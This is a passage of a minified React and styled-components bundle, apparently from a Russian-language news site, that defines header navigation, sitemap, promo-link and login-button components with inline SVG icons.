          })(["font-size:16px;line-height:21px;font-weight:400;color:#000000;padding-top:6px;"]),
          Q = s.ZP.div.withConfig({
            displayName: "styled__SitemapTop",
            componentId: "sc-1w3elxd-23"
          })(["padding:12px 12px 1rem 12px;background-color:#e0e0e0;width:100%;box-sizing:border-box;"]),
          P = s.ZP.div.withConfig({
            displayName: "styled__SitemapLogin",
            componentId: "sc-1w3elxd-24"
          })(["display:flex;flex-flow:row;justify-content:space-between;align-items:center;margin-bottom:14px;"]),
          U = s.ZP.div.withConfig({
            displayName: "styled__Sitemap",
            componentId: "sc-1w3elxd-25"
          })(["background-color:#e0e0e0;padding-right:20px;border-bottom:1px solid #fff;color:#3d484a;font-size:16px;font-weight:700;margin-top:0;position:absolute;top:-500px;z-index:0;display:none;transition:top 0.5s ease;", " @media (max-width:1024px){", "}@media (max-width:768px){top:-800px;width:100%;", " padding-right:0px;", "{width:100%;display:grid;grid-template-columns:repeat(2,1fr);background:#3d484a;grid-row-gap:1px;grid-column-gap:1px;}", "{padding-left:12px;font-size:17px;line-height:22px;font-weight:700;color:#3d484a;background:#f2f2f2;border:none;padding-right:12px;box-sizing:border-box;&:last-child{width:100%;grid-column-start:1;grid-column-end:3;text-align:center;padding-left:0;}&:hover{background-color:#ce0000;span{color:#fff;}}}}"], (0, M.fq)("$isOpen", (0, s.iv)(["top:", "px;display:block;z-index:10;"], g.Pu)), (0, M.fq)("$isOpen", (0, s.iv)(["top:", "px;"], g.Xt)), (0, M.fq)("$isOpen", (0, s.iv)(["top:", "px;"], g.SI)), A, v),
          Y = (0, s.ZP)(d.rH).withConfig({
            displayName: "styled__PromoLink",
            componentId: "sc-1w3elxd-26"
          })(["font-size:", "px;font-family:inherit;flex-shrink:0;margin-right:", "rem;margin-left:", "rem;display:block;width:", ";line-height:1.1;background-repeat:no-repeat;&:after{background-image:", ";}span{position:relative;z-index:1;}@media (max-width:1024px){font-size:", "px;width:", ";margin-right:0px;margin-left:0px;}", ""], function (e) {
            return e.$desktopFont ? e.$desktopFont : 22;
          }, function (e) {
            return e.$marginRight ? e.$marginRight : 0;
          }, function (e) {
            return e.$marginLeft ? e.$marginLeft : 0;
          }, function (e) {
            return e.$desktopWidth ? "".concat(e.$desktopWidth, "px") : "auto";
          }, function (e) {
            return e.$secondImage ? "url(".concat(e.$secondImage, ")") : "none";
          }, function (e) {
            return e.$mobileFont ? e.$mobileFont : 18;
          }, function (e) {
            return e.$mobileWidth ? "".concat(e.$mobileWidth, "px") : "auto";
          }, (0, M.fq)("$secondImage", (0, s.iv)(['position:relative;width:82px;height:36px;&:after{content:"";position:absolute;top:0;left:0;bottom:0;right:0;background-position:0 0;background-repeat:no-repeat;height:36px;width:100%;z-index:0;}']))),
          _ = (0, s.ZP)(d.rH).withConfig({
            displayName: "styled__PromoLinkContainer",
            componentId: "sc-1w3elxd-27"
          })(["font-size:", "px;position:relative;font-family:inherit;width:", ';&:hover{border-color:transparent;}&:after{content:"";position:absolute;top:-7px;left:45px;height:78px;width:104px;transform:translate(-50%,-50%);background:url(', ") no-repeat;background-size:cover;}span{z-index:1;position:relative;}@media (max-width:1024px){margin-right:0px;margin-left:0px;width:", ";&:after{height:67px;width:100px;}}"], function (e) {
            return e.$desktopFont ? e.$desktopFont : 19;
          }, function (e) {
            return e.$desktopWidth ? "".concat(e.$desktopWidth, "px") : "auto";
          }, function (e) {
            return e.$image ? e.$image : "";
          }, function (e) {
            return e.$mobileWidth ? "".concat(e.$mobileWidth, "px") : "auto";
          }),
          W = (0, s.ZP)(d.rH).withConfig({
            displayName: "styled__PartnerLogo",
            componentId: "sc-1w3elxd-28"
          })(["height:1.622rem;width:7.623rem;margin-left:auto;background:url(", ") no-repeat;background-size:cover;@media (max-width:768px){height:1.622rem;background-size:contain;background-position:center center;width:4rem;margin-bottom:-5px;margin-right:-5px;}"], function (e) {
            return e.$image ? e.$image : "";
          }),
          G = (0, s.ZP)(d.rH).withConfig({
            displayName: "styled__BrthCoin",
            componentId: "sc-1w3elxd-29"
          })(["margin-left:11px;display:inline-block;height:43px;width:56px;background:url(", ") 0 0 no-repeat;@media (max-width:1024px){height:36px;width:46px;margin-left:6px;background-size:contain;}"], "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNTUiIGhlaWdodD0iNDMiIHZpZXdCb3g9IjAgMCA1NSA0MyIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0xNy45NzI0IDI1LjM2ODVMMTguMDMxNyAyNS40Mjc1TDcuMDE5ODMgNDEuOTM4MUgxMy42ODQ0TDI0LjM4MzMgMjUuMDk4OEMyNS41NDIgMjMuMjEwOSAyNi40OTc3IDIxLjM1NjcgMjcuMjI1MSAxOS41NDQ3QzI3Ljk2OTQgMTcuNzMyNyAyOC4zMzMgMTUuNzA5OSAyOC4zMzMgMTMuNDc2NUMyOC4zMzMgMTEuNTQ2NSAyNy45Njk0IDkuNzUxMjggMjcuMjU4OSA4LjA5OTM3QzI2LjU0ODUgNi40MzkwNCAyNS41Njc0IDUuMDE0NyAyNC4zMDcyIDMuODE3OTFDMjMuMDQ3IDIuNjIxMTMgMjEuNTU4NSAxLjY5NDA0IDE5LjgxNjIgMS4wMTEzN0MxOC4wOTA5IDAuMzM3MTIzIDE2LjIxMzMgMCAxNC4yMDAzIDBDMTIuMTg3NCAwIDEwLjMwOTggMC4zMjg2OTUgOC41NzYwMyAwLjk3NzY1N0M2LjgzMzc2IDEuNjM1MDUgNS4zMjgzIDIuNTUzNzEgNC4wNTEyIDMuNzUwNDlDMi43NzQxIDQuOTQ3MjggMS43NzYxIDYuMzgwMDUgMS4wNjU2NiA4LjA1NzIzQzAuMzU1MjIgOS43MzQ0MiAwIDExLjU5NyAwIDEzLjYzNjZDMCAxNS40ODI0IDAuMzI5ODQ3IDE3LjE5MzMgMC45ODEwODMgMTguNzUyNUMxLjYzMjMyIDIwLjMzNjkgMi41MzcyOSAyMS42OTM4IDMuNzA0NDQgMjIuODMxNkM0Ljg3MTU5IDIzLjk2OTQgNi4yMTYzNSAyNC44NjI4IDcuNzY0MSAyNS40OTQ5QzkuMzAzMzggMjYuMTQzOSAxMC45ODY1IDI2LjQ1NTcgMTIuODA0OCAyNi40NTU3QzEzLjI0NDYgMjYuNDU1NyAxMy42ODQ0IDI2LjQzMDQgMTQuMTc1IDI2LjM3MTRDMTQuNjY1NSAyNi4zMTI0IDE1LjEzMDcgMjYuMjQ1IDE1LjU5NTkgMjYuMTY5MkMxNi41OTM5IDI1Ljk4MzcgMTcuMzk3MyAyNS43MTQgMTcuOTcyNCAyNS4zNjg1Wk0yMi4xNjc0IDEwLjAyOTRDMjIuNTczNCAxMS4wOTEzIDIyLjc3NjMgMTIuMjEyMyAyMi43NzYzIDEzLjQwOTFDMjIuNzc2MyAxNC42ODE3IDIyLjU3MzQgMTUuODI3OSAyMi4xNDIgMTYuODY0NkMyMS43MzYgMTcuOTAxMiAyMS4xNTI1IDE4LjgxMTUgMjAuMzk5NyAxOS41Nzg0QzE5LjYzODYgMjAuMzQ1NCAxOC43MzM2IDIwLjk0MzggMTcuNjY3OSAyMS4zNjUyQzE2LjYxMDcgMjEuNzg2NiAxNS40MzUxIDIxLjk5NzMgMTQuMTU4IDIxLjk5NzNDMTIuODcyNSAyMS45OTczIDExLjcyMjIgMjEuNzg2NiAxMC42ODE5IDIxLjM2NTJDOS42MzMxOSAyMC45NDM4IDguNzM2NjggMjAuMzUzOCA4LjAwOTMzIDE5LjU3ODRDNy4yODE5NyAxOC44MDMgNi43MDY4NSAxNy45MDk3IDYuMzAwODkgMTYuODY0NkM1Ljg5NDkyIDE1LjgzNjMgNS42OTE5NCAxNC42OTAxIDUuNjkxOTQgMTMuNDU5NkM1LjY5MTk0IDEyLjE4NyA1Ljg5NDkyIDExLjAxNTUgNi4zMDA4OSA5LjkzNjdDNi43MDY4NSA4Ljg1NzkxIDcuMjgxOTcgNy45MzkyNSA4LjA0MzE2IDcuMTYzODZDOC44MDQzNCA2LjM5NjkxIDkuNzAwODUgNS43ODE2NiAxMC43NDk2IDUuMzQzNEMxMS43ODk5IDQuOTA1MTQgMTIuOTU3IDQuNjg2MDEgMTQuMjM0MSA0LjY4NjAxQzE1LjUxMTIgNC42ODYwMSAxNi42Njk5IDQuOTIyIDE3LjcxODcgNS4zNzcxMkMxOC43Njc0IDUuODQwNjYgMTkuNjYzOSA2LjQ3Mjc2IDIwLjQyNTEgNy4yNTY1N0MyMS4xNzc4IDguMDQ4ODEgMjEuNzYxNCA4Ljk2NzQ3IDIyLjE2NzQgMTAuMDI5NFoiIGZpbGw9InVybCgjcGFpbnQwX2xpbmVhcl8zM18xMykiLz4KPHBhdGggZD0iTTM2LjI3NDggNi4wMDkyMUwzNS45MjgxIDE2LjcwNDRDMzYuNjk3NyAxNi40MjYzIDM3LjU2MDQgMTYuMjMyNSAzOC41MTYxIDE2LjEyMjlDMzkuNDcxOCAxNi4wMDQ5IDQwLjM1OTkgMTUuOTU0MyA0MS4yMjI1IDE1Ljk1NDNDNDMuMTkzMiAxNS45NTQzIDQ1LjAyIDE2LjI0OTMgNDYuNzIgMTYuODU2MUM0OC40MDMxIDE3LjQ2MyA0OS44NTc4IDE4LjMxNDIgNTEuMDc1NyAxOS40MjY3QzUyLjI5MzYgMjAuNTQ3NiA1My4yNDkzIDIxLjkwNDUgNTMuOTUxMyAyMy41MTQzQzU0LjY0NDggMjUuMTE1NiA1NSAyNi45MDI0IDU1IDI4Ljg3NDZDNTUgMzEuMDQwNiA1NC42MzYzIDMyLjk4NzUgNTMuODkyIDM0LjcyMzZDNTMuMTY0NyAzNi40NjgyIDUyLjE0OTggMzcuOTM0NyA1MC44NzI3IDM5LjE1NjhDNDkuNTk1NiA0MC4zNzA0IDQ4LjA4MTcgNDEuMzIyOCA0Ni4zMzk0IDQxLjk4ODZDNDQuNTk3MSA0Mi42NzEzIDQyLjcwMjYgNDMgNDAuNjQ3NCA0M0MzNy40MzM1IDQzIDM0LjcxODYgNDIuMjQ5OSAzMi41MTk2IDQwLjc4MzRDMzAuMzIwNyAzOS4zMDAxIDI4LjY0NiAzNy4zMTExIDI3LjUyOTYgMzQuNzk5NUwzMi42MzggMzIuNzc2OEMzMy4yODkzIDM0LjQyODcgMzQuMzI5NiAzNS43NjAzIDM1Ljc0MiAzNi43NjMyQzM3LjE1NDQgMzcuNzY2MiAzOC43OTUyIDM4LjI2MzQgNDAuNjQ3NCAzOC4yNjM0QzQxLjg0ODQgMzguMjYzNCA0Mi45NzMzIDM4LjA1MjcgNDQuMDEzNSAzNy42MzEzQzQ1LjA2MjMgMzcuMjA5OSA0NS45NjczIDM2LjYxMTUgNDYuNzQ1NCAzNS44NDQ2QzQ3LjUxNSAzNS4wNzc2IDQ4LjEzMjQgMzQuMTUwNSA0OC41NzIyIDMzLjA3MTdDNDkuMDEyIDMxLjk5MjkgNDkuMjMxOSAzMC43OTYyIDQ5LjIzMTkgMjkuNDg5OEM0OS4yMzE5IDI3Ljk0NzUgNDguOTY5NyAyNi42MDc0IDQ4LjQ0NTMgMjUuNDY5NkM0Ny45Mjk0IDI0LjMzMTggNDcuMjEwNSAyMy40MDQ3IDQ2LjMzMDkgMjIuNjYzMUM0NS40MzQ0IDIxLjkzODMgNDQuNDE5NSAyMS4zOTA0IDQzLjI1MjQgMjEuMDQ0OUM0Mi4wODUyIDIwLjY5OTMgNDAuODY3MyAyMC41MzA4IDM5LjU5ODcgMjAuNTMwOEMzOC4wNTA5IDIwLjUzMDggMzYuNDYwOSAyMC43NDE1IDM0LjgzNyAyMS4xNzEzQzMzLjIxMzIgMjEuNjAxMSAzMS43NTg0IDIyLjE0MDUgMzAuNDgxMyAyMi43ODk1TDMxLjA1NjUgMS4wNzAzNkg1My4yNDA4VjYuMDA5MjFIMzYuMjc0OFoiIGZpbGw9InVybCgjcGFpbnQxX2xpbmVhcl8zM18xMykiLz4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik00OC4xMDY5IDEwLjk5ODZINDUuNDA5QzQ1LjM5MjEgMTEuNzgyNCA0NS45ODQxIDExLjg3NTEgNDYuMzEzOSAxMS44NzUxQzQ2Ljg4OTEgMTEuODc1MSA0Ny40MDUgMTEuNzU3MiA0Ny45MDQgMTEuNDg3NUw0Ny43MjY0IDEyLjU5MTVDNDcuMTc2NiAxMi44NjEyIDQ2LjYxIDEyLjkzNzEgNDYuMDAxIDEyLjkzNzFDNDQuMTMxOSAxMi45MzcxIDQzLjkyMDQgMTEuNjM5MiA0My45MjA0IDEwLjk4MThDNDMuOTI4OSA5LjU3NDI4IDQ0Ljc0OTMgOC40MjgwNiA0Ni4zMjI0IDguNDI4MDZDNDcuOTU0NyA4LjQyODA2IDQ4LjMwMTUgOS43NjgxMyA0OC4xMDcgMTAuOTkwMkw0OC4xMDY5IDEwLjk5ODZaTTQ2LjIyOTMgOS4zNjM1OUM0NS42NjI3IDkuMzYzNTkgNDUuNTEwNCA5LjgzNTU2IDQ1LjQ0MjggMTAuMjkwN0g0Ni43NDUzQzQ2Ljc5NiA5LjkxMTQxIDQ2Ljc5NiA5LjM2MzU5IDQ2LjIyOTMgOS4zNjM1OVoiIGZpbGw9InVybCgjcGFpbnQyX2xpbmVhcl8zM18xMykiLz4KPHBhdGggZD0iTTQ5LjExMzQgOC41NzEzNkw0OC45NTI3IDkuNzAwNzJINTAuMzMxM0w0OS45MjUzIDEyLjgwMjJINTEuMzhMNTEuNzk0NCA5LjcwMDcySDUzLjE4OTlMNTMuMzUwNiA4LjU3MTM2SDQ5LjExMzRaIiBmaWxsPSJ1cmwoI3BhaW50M19saW5lYXJfMzNfMTMpIi8+CjxwYXRoIGQ9Ik00MS42MDMgOS42MTY0NEw0MS4xMDQgMTIuODAyMkw0Mi41NDE4IDEyLjgwMjJMNDMuMjEgOC41NzEzNkgzOS43MzM5TDM5LjQ5NzEgOS41MTUzQzM5LjE5MjYgMTAuNzYyNyAzOS4wNjU4IDExLjA5MTMgMzguOTM4OSAxMS4yOTM2QzM4Ljc0NDQgMTEuNTg4NiAzOC41MzI5IDExLjY4OTcgMzguMDU5MyAxMS43OTA5TDM4LjI3OTIgMTIuOTExOEMzOS45NjIzIDEyLjc2ODUgNDAuMjc1MiAxMS43NjU2IDQwLjUwMzUgMTAuNzk2NEM0MC41MTk1IDEwLjc0NDcgNDAuNTMxNyAxMC42OTMxIDQwLjU2NDkgMTAuNTUyNEM0MC42MDIxIDEwLjM5NDUgNDAuNjY1OSAxMC4xMjQ1IDQwLjc5MTEgOS42MTY0NEg0MS42MDNaIiBmaWxsPSJ1cmwoI3BhaW50NF9saW5lYXJfMzNfMTMpIi8+CjxkZWZzPgo8bGluZWFyR3JhZGllbnQgaWQ9InBhaW50MF9saW5lYXJfMzNfMTMiIHgxPSI0Ni4zMzEyIiB5MT0iMjguMTExOCIgeDI9IjQ2LjMzMTIiIHkyPSI0MS42NjY2IiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+CjxzdG9wIHN0b3AtY29sb3I9IiM4QThBOEEiIHN0b3Atb3BhY2l0eT0iMC41MyIvPgo8c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiM4RThFOEUiIHN0b3Atb3BhY2l0eT0iMC4xMiIvPgo8L2xpbmVhckdyYWRpZW50Pgo8bGluZWFyR3JhZGllbnQgaWQ9InBhaW50MV9saW5lYXJfMzNfMTMiIHgxPSI0Ni4zMzEyIiB5MT0iMjguMTExOCIgeDI9IjQ2LjMzMTIiIHkyPSI0MS42NjY2IiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+CjxzdG9wIHN0b3AtY29sb3I9IiM4QThBOEEiIHN0b3Atb3BhY2l0eT0iMC41MyIvPgo8c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiM4RThFOEUiIHN0b3Atb3BhY2l0eT0iMC4xMiIvPgo8L2xpbmVhckdyYWRpZW50Pgo8bGluZWFyR3JhZGllbnQgaWQ9InBhaW50Ml9saW5lYXJfMzNfMTMiIHgxPSI0Ni4zMzEyIiB5MT0iMjguMTExOCIgeDI9IjQ2LjMzMTIiIHkyPSI0MS42NjY2IiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+CjxzdG9wIHN0b3AtY29sb3I9IiM4QThBOEEiIHN0b3Atb3BhY2l0eT0iMC41MyIvPgo8c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiM4RThFOEUiIHN0b3Atb3BhY2l0eT0iMC4xMiIvPgo8L2xpbmVhckdyYWRpZW50Pgo8bGluZWFyR3JhZGllbnQgaWQ9InBhaW50M19saW5lYXJfMzNfMTMiIHgxPSI0Ni4zMzEyIiB5MT0iMjguMTExOCIgeDI9IjQ2LjMzMTIiIHkyPSI0MS42NjY2IiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+CjxzdG9wIHN0b3AtY29sb3I9IiM4QThBOEEiIHN0b3Atb3BhY2l0eT0iMC41MyIvPgo8c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiM4RThFOEUiIHN0b3Atb3BhY2l0eT0iMC4xMiIvPgo8L2xpbmVhckdyYWRpZW50Pgo8bGluZWFyR3JhZGllbnQgaWQ9InBhaW50NF9saW5lYXJfMzNfMTMiIHgxPSI0Ni4zMzEyIiB5MT0iMjguMTExOCIgeDI9IjQ2LjMzMTIiIHkyPSI0MS42NjY2IiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+CjxzdG9wIHN0b3AtY29sb3I9IiM4QThBOEEiIHN0b3Atb3BhY2l0eT0iMC41MyIvPgo8c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiM4RThFOEUiIHN0b3Atb3BhY2l0eT0iMC4xMiIvPgo8L2xpbmVhckdyYWRpZW50Pgo8L2RlZnM+Cjwvc3ZnPgo="),
          R = s.ZP.div.withConfig({
            displayName: "styled__SpecialMarkContainer",
            componentId: "sc-1w3elxd-30"
          })(["position:absolute;left:0;bottom:0;width:", "px;border-bottom:2px solid ", ";-webkit-transform:skew(-8deg);-moz-transform:skew(-8deg);-o-transform:skew(-8deg);z-index:5;display:inline-block;@media (max-width:1024px){width:", "px;}"], function (e) {
            return e.$desktopWidth ? e.$desktopWidth : 216;
          }, function (e) {
            return e.$color ? e.$color : "transparent";
          }, function (e) {
            return e.$mobileWidth ? e.$mobileWidth : 167;
          }),
          H = s.ZP.div.withConfig({
            displayName: "styled__SpecialMark",
            componentId: "sc-1w3elxd-31"
          })(["background-color:", ";color:#fff;text-transform:uppercase;float:right;font-size:17px;font-weight:700;line-height:14px;padding:2px 7px 0px;box-shadow:0px -5px 10px 3px rgba(255,255,255,0.4);span{display:inline-block;-webkit-transform:skew(8deg);-moz-transform:skew(8deg);-o-transform:skew(8deg);}@media (max-width:1024px){font-size:14px;}"], function (e) {
            return e.$color ? e.$color : "transparent";
          }),
          B = s.ZP.div.withConfig({
            displayName: "styled__LogoContainer",
            componentId: "sc-1w3elxd-32"
          })(["height:43px;margin-right:0px;@media (max-width:1024px){height:36px;margin-right:0px;}"]),
          F = s.ZP.div.withConfig({
            displayName: "styled__Sticker",
            componentId: "sc-1w3elxd-33"
          })(["display:inline-block;@media (max-width:1024px){margin-left:8px;}"]),
          J = i(7154),
          V = i.n(J),
          $ = i(6479),
          q = i.n($),
          X = ["color", "desktopFont", "mobileFont", "target", "fontWeight", "href", "image", "name", "marginRight", "marginLeft", "secondImage", "desktopWidth", "mobileWidth"];
        function K(e) {
          var t = e.color,
            i = void 0 === t ? "#fff" : t,
            n = e.desktopFont,
            r = e.mobileFont,
            a = e.target,
            o = void 0 === a ? "_self" : a,
            c = e.fontWeight,
            s = void 0 === c ? 400 : c,
            M = e.href,
            d = e.image,
            g = e.name,
            u = e.marginRight,
            m = e.marginLeft,
            p = e.secondImage,
            y = e.desktopWidth,
            I = e.mobileWidth,
            N = q()(e, X);
          return d ? l.createElement(_, V()({}, N, {
            href: M,
            $desktopFont: n,
            $mobileFont: r,
            $desktopWidth: y,
            $mobileWidth: I,
            color: i,
            weight: s,
            target: o,
            $image: d,
            label: "Ссылка"
          }), g && l.createElement("span", null, g)) : l.createElement(Y, V()({}, N, {
            href: M,
            $desktopFont: n,
            $mobileFont: r,
            $desktopWidth: y,
            $mobileWidth: I,
            color: i,
            weight: s,
            target: o,
            $marginRight: u,
            $marginLeft: m,
            $secondImage: p,
            label: "Ссылка"
          }), g && l.createElement("span", null, g));
        }
        function ee(e) {
          var t = e.mainNav,
            i = e.nav,
            n = t || i;
          return l.createElement(l.Fragment, null, l.createElement(y, null, l.createElement(I, null, !t && "" !== g.kA.utils.href && "" !== g.kA.utils.name && l.createElement(K, {
            href: g.kA.utils.href,
            name: g.kA.utils.name,
            color: "#ffd600",
            desktopFont: 21,
            target: "_blank",
            fontWeight: 700,
            marginRight: 1.75
          }), n && n.map(function (e) {
            var t = e.href,
              i = e.id,
              n = e.name;
            return "Магазин" === n ? null : "Гран-при" === n ? l.createElement(l.Fragment, {
              key: "".concat(t, "-").concat(i)
            }, l.createElement(K, {
              href: g.kA.goods.href,
              name: g.kA.goods.name,
              fontWeight: 700,
              color: "#2C3436"
            })) : l.createElement(N, {
              href: t,
              key: i,
              target: e.blank ? "_blank" : "_top",
              color: "#2C3436",
              weight: 700
            }, n);
          }))));
        }
        var te = i(2873),
          ie = i(3989),
          ne = i(7137);
        function re(e) {
          var t = e.secondNav,
            i = e.disableControls,
            n = void 0 !== i && i,
            r = e.secondPromo,
            a = void 0 === r || r,
            s = (0, c.v9)(te.Ug),
            M = (0, l.useState)(!0),
            d = o()(M, 2),
            u = d[0],
            m = d[1],
            p = (0, l.useState)(!1),
            y = o()(p, 2),
            I = y[0],
            N = y[1],
            j = (0, ie.Fs)().isMobile,
            h = (0, l.useRef)(null),
            z = t || s,
            E = !n || j,
            A = function (e) {
              var t = "prev" === e,
                i = "next" === e;
              if (h.current) {
                var n = h.current,
                  r = n.scrollLeft,
                  a = t ? r - 200 : r + 200;
                n.scrollLeft = a;
                var o = n.scrollWidth,
                  l = n.getBoundingClientRect(),
                  c = Math.ceil(l.width),
                  s = (0, ne.GN)(a, o, c);
                t && ((0 === a || a < 0) && m(!0), s || N(!1)), i && (a > 0 && m(!1), s && N(!0));
              }
            };
          return l.createElement(x, null, E && l.createElement(l.Fragment, null, l.createElement(T, {
            onClick: function () {
              return A("prev");
            },
            $isPrevDisabled: u
          }, u ? "#" : "<"), j && a && "" !== g.kA.utils.mobhref && "" !== g.kA.utils.href && l.createElement(K, {
            href: g.kA.utils.mobhref ? g.kA.utils.mobhref : g.kA.utils.href,
            name: g.kA.utils.name,
            fontWeight: 700,
            marginLeft: .6875,
            target: "_blank"
          })), l.createElement(w, null, l.createElement(D, {
            ref: h,
            $spaceBetween: n
          }, z.map(function (e) {
            var t = e.href,
              i = e.name,
              n = e.order;
            return i ? l.createElement(f, {
              href: t,
              key: n,
              color: "#3D484A"
            }, i) : null;
          }))), E && l.createElement(L, {
            onClick: function () {
              return A("next");
            },
            $isNextDisabled: I
          }, I ? "#" : ">"));
        }
        function ae(e) {
          var t = e.isOpen,
            i = e.onClose,
            n = (0, c.v9)(te.lA),
            r = (0, c.v9)(te.LZ);
          return l.createElement(U, {
            $isOpen: t
          }, l.createElement(E, null, l.createElement(A, {
            onClick: i
          }, n && n.map(function (e) {
            var t = e.href,
              i = e.name;
            return l.createElement(v, {
              href: t,
              key: t
            }, l.createElement("span", null, i));
          })), l.createElement(b, null, l.createElement(O, null, r && r.map(function (e) {
            var t = e.date,
              n = e.href,
              r = e.picture,
              a = e.name,
              o = e.announcementXml,
              c = e.id;
            return l.createElement(k, {
              key: c,
              onClick: i
            }, n && l.createElement(d.rH, {
              href: n
            }, r && l.createElement(d.Ee, {
              picture: r,
              height: 145
            })), t && l.createElement(C, {
              date: t
            }), n && l.createElement(S, {
              href: n,
              color: "#000"
            }, l.createElement("span", null, a), o && l.createElement(Z, null, (0, ne.d0)(o))));
          })), l.createElement(d.WG, {
            network: ["zen", "vk", "youtube", "tg", "viber", "ok"],
            width: 42,
            height: 42,
            dark: !0
          }))));
        }
        var oe = i(6258),
          le = i(5601),
          ce = s.ZP.span.withConfig({
            displayName: "styled__LoginButton",
            componentId: "sc-1aty3gd-0"
          })(["display:block;color:#fff;font-size:15px;line-height:34px;position:relative;white-space:nowrap;width:1.875rem;height:1.875rem;background:url(", ") no-repeat center center;margin-left:1.1875rem;cursor:pointer;"], "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzAiIGhlaWdodD0iMzEiIHZpZXdCb3g9IjAgMCAzMCAzMSIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0xNSAzMC43OTEyQzIzLjI4NDMgMzAuNzkxMiAzMCAyNC4wNzU1IDMwIDE1Ljc5MTJDMzAgNy41MDY5NCAyMy4yODQzIDAuNzkxMjA4IDE1IDAuNzkxMjA4QzYuNzE1NzMgMC43OTEyMDggMCA3LjUwNjk0IDAgMTUuNzkxMkMwIDI0LjA3NTUgNi43MTU3MyAzMC43OTEyIDE1IDMwLjc5MTJaTTIxIDYuNzkxMzZIMTBDOS43MjM4OCA2Ljc5MTM2IDkuNDg4MTYgNi44ODg5OSA5LjI5Mjg1IDcuMDg0MjVDOS4wOTc2NiA3LjI3OTUxIDkgNy41MTUyMiA5IDcuNzkxMzdDOSA4LjA2NzUgOS4wOTc2NiA4LjMwMzIyIDkuMjkyODUgOC40OTg0N0M5LjQ4ODE2IDguNjkzNzQgOS43MjM4OCA4Ljc5MTM2IDEwIDguNzkxMzZIMjBWMjIuNzkxOEgxMEM5LjcyMzg4IDIyLjc5MTggOS40ODgxNiAyMi44ODk0IDkuMjkyODUgMjMuMDg0N0M5LjA5NzY2IDIzLjI3OTkgOSAyMy41MTU2IDkgMjMuNzkxOEM5IDI0LjA2NzkgOS4wOTc2NiAyNC4zMDM2IDkuMjkyODUgMjQuNDk4OUM5LjQ4ODE2IDI0LjY5NDIgOS43MjM4OCAyNC43OTE4IDEwIDI0Ljc5MThIMjFDMjEuMjc2MSAyNC43OTE4IDIxLjUxMTggMjQuNjk0MiAyMS43MDcyIDI0LjQ5ODlDMjEuOTAyMyAyNC4zMDM2IDIyIDI0LjA2NzkgMjIgMjMuNzkxOFYyMy43OTE2VjIzLjc5MTRWNy43OTEzN0MyMiA3LjUxNTIyIDIxLjkwMjMgNy4yNzk1MSAyMS43MDcyIDcuMDg0MjVDMjEuNTExOCA2Ljg4ODk5IDIxLjI3NjEgNi43OTEzNiAyMSA2Ljc5MTM2Wk0xNi4yNzg2IDE1LjE2TDEyLjgxOTIgMTAuMjE4QzEyLjY2MDggOS45OTE3NiAxMi40NDU3IDkuODU0NjcgMTIuMTczNyA5LjgwNjY2QzExLjkwMTcgOS43NTg2OSAxMS42NTI3IDkuODEzODcgMTEuNDI2NSA5Ljk3MjIyQzExLjIwMDIgMTAuMTMwNiAxMS4wNjMxIDEwLjM0NTcgMTEuMDE1MSAxMC42MTc3QzEwLjk2NzIgMTAuODg5NiAxMS4wMjIzIDExLjEzODcgMTEuMTgwNyAxMS4zNjQ5TDEzLjU3OTMgMTQuNzkxNkg1QzQuNzIzODggMTQuNzkxNiA0LjQ4ODE2IDE0Ljg4OTIgNC4yOTI4NSAxNS4wODQ1QzQuMDk3NjYgMTUuMjc5NyA0IDE1LjUxNTQgNCAxNS43OTE2QzQgMTYuMDY3NyA0LjA5NzY2IDE2LjMwMzQgNC4yOTI4NSAxNi40OTg3QzQuNDg4MTYgMTYuNjkzOSA0LjcyMzg4IDE2Ljc5MTYgNSAxNi43OTE2SDEzLjU3OTJMMTEuMTgwNyAyMC4yMTgxQzExLjEwNDYgMjAuMzI2OCAxMS4wNTIyIDIwLjQ0NTggMTEuMDIzNiAyMC41NzUzQzEwLjk5NDkgMjAuNzA0OCAxMC45OTIxIDIwLjgzNDggMTEuMDE1MSAyMC45NjU0QzExLjAzODIgMjEuMDk1OSAxMS4wODUzIDIxLjIxNzEgMTEuMTU2NiAyMS4zMjlDMTEuMjI3OSAyMS40NDA4IDExLjMxNzkgMjEuNTM0OCAxMS40MjY1IDIxLjYxMDhDMTEuNjUyNyAyMS43NjkyIDExLjkwMTcgMjEuODI0NCAxMi4xNzM3IDIxLjc3NjRDMTIuNDQ1NyAyMS43Mjg0IDEyLjY2MDggMjEuNTkxMyAxMi44MTkyIDIxLjM2NTFMMTYuMjc4NiAxNi40MjNDMTYuMzM5OSAxNi4zNDg5IDE2LjM4ODcgMTYuMjY2NyAxNi40MjUgMTYuMTc2NkMxNi40Nzc2IDE2LjA1NDMgMTYuNTAzMSAxNS45MjU5IDE2LjUwMTQgMTUuNzkxNUMxNi41MDMxIDE1LjY1NzEgMTYuNDc3NiAxNS41Mjg3IDE2LjQyNDkgMTUuNDA2M0MxNi4zODg2IDE1LjMxNjIgMTYuMzM5OSAxNS4yMzQxIDE2LjI3ODYgMTUuMTZaIiBmaWxsPSIjM0Q0ODRBIi8+Cjwvc3ZnPgo="),
          se = s.ZP.div.withConfig({
            displayName: "styled__UserDialog",
            componentId: "sc-1aty3gd-1"
